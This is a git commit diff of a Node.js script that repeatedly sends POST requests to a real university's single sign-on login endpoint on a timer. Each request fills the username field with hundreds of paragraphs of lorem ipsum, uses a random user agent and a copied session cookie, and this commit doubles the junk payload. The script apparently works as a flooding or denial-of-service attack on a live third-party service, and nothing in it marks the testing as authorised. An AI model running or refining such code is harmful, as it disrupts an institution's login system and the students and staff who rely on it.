b2317e1c705f1c4515d1ffdb33a8197361f154c3
Wei Loong <weiloong@netizenexperience.com>
2023-12-12 23:28:24 +0800

    advance

--- index.js
+++ index.js
@@ -15,40 +15,42 @@ const lorem = new LoremIpsum({
     }
 });
 
-  
-let config = (userName) => ({
+
+
+
+let config = (u) => ({
     method: 'post',
     maxBodyLength: Infinity,
-    url: 'https://sso.um.edu.my/cas/login;jsessionid=6C9DDCD440FD82C420305B85C3A78C61',
+    url: 'https://sso.um.edu.my/cas/loginAllType?service=https://mysis.um.edu.my/ctes/landing',
     headers: {
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'Accept-Language': 'en-GB,en;q=0.9',
         'Cache-Control': 'max-age=0',
         'Connection': 'keep-alive',
         'Content-Type': 'application/x-www-form-urlencoded',
-        'Cookie': 'JSESSIONID=6C9DDCD440FD82C420305B85C3A78C61',
+        'Cookie': 'JSESSIONID=79D714ADD69277427376BB961005F4A8',
         'Origin': 'https://sso.um.edu.my',
-        'Referer': 'https://sso.um.edu.my/cas/login',
+        'Referer': 'https://sso.um.edu.my/cas/loginAllType?service=https%3A%2F%2Fmysis.um.edu.my%2Fctes%2Flanding',
         'Sec-Fetch-Dest': 'document',
         'Sec-Fetch-Mode': 'navigate',
         'Sec-Fetch-Site': 'same-origin',
         'Sec-Fetch-User': '?1',
         'Upgrade-Insecure-Requests': '1',
         'User-Agent': randomUseragent.getRandom(),
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"'
     },
     data: qs.stringify({
-        'uname': userName,
-        'domain': 'um.edu.my',
-        'password': 'QATEST',
-        'lt': '_c6F771141-3E63-AF43-9B65-3BD52E3A839A_kC9629405-7C26-D1FB-3103-91AF34822339',
+        'uname': u,
+        'password': 'QA TEST',
+        'domain': '@um.edu.my',
         '_eventId': 'submit',
-        'username': 'QATEST@um.edu.my'
+        'username': 'qwerewrwe@um.edu.my'
     })
 })
 
 setInterval(() => {
-
-    axios.request(config(lorem.generateParagraphs(100)))
+    axios.request(config(lorem.generateParagraphs(200)))
         .then((response) => {
             console.count(response.status);
         })
